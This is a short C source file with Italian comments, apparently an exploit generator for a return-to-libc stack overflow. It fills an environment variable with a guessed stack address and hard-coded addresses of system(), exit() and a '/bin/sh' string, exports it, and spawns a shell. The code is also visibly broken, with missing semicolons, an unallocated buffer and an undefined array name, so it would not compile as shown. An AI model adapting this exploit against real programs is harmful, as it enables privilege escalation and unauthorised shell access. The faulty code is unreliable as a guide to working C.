#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define OFFSET_SIZE         0
#define BUFFER_SIZE       600

char shellcode[] =
    "\x40\x34\xa3\xf7\xff\x7f"          // Indirizzo di "system()" effettivo ottenuto con "gdb" (real address = "0x7ffff7a33440", al contrario poiche` LITTLE ENDIAN)
    "\x20\x71\xa2\xf7\xff\x7f"          // Indirizzo di "exit()" effettivo ottenuto con "gdb" (real address = "0x7ffff7a27120")
    "\xa0\x8a\xb2\x42"                  // Indirizzo di "binsh", non effettivo (ottenibile con "memfetch" o tramite "variabile d'ambiente")

unsigned long find_start(void){
  __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[]){
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset = OFFSET_SIZE, bsize = BUFFER_SIZE;
  int i;

  if(argc > 1)  bsize = atoi(argv[1])
  if(argc > 2)  offset = atoi(argv[2])

  addr = find_start() - offset;
  ptr = buff;
  addr_ptr = (long *) ptr;
  for(i = 0; i < bsize; i += 4)
    *(addr_ptr++) = addr;

  ptr += 4

  for(i = 0; i < strlen(shellcode); i++)
    *(ptr++) = sc[i];

  buff[bsize - 1] = '\0';

  memcpy(buff, "BUF=", 4);
  putenv(buff);
  system("/bin/bash");

}
